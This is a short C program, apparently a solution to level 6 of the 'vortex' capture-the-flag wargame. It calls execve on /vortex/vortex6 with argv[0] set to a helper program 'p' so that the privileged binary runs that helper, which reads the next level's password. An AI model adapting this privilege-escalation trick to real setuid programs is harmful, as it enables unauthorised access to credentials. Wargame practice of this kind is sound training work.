#include <unistd.h>

// Program basically just excecutes the program in the first argument of argv
// Under normal conventions, this is the name of the the program, but we can just put whatever there
// Whatever program is in argv[0] gets called as long as we have environment variables
// Our code that reads the password is compiled to the program "p"

int main() {
  char *filename = "/vortex/vortex6";
  char *argv[] = {"p", NULL};
  char *arge[] = {"whatever", NULL};
  
  execve(filename, argv, arge);

  return 0;
}
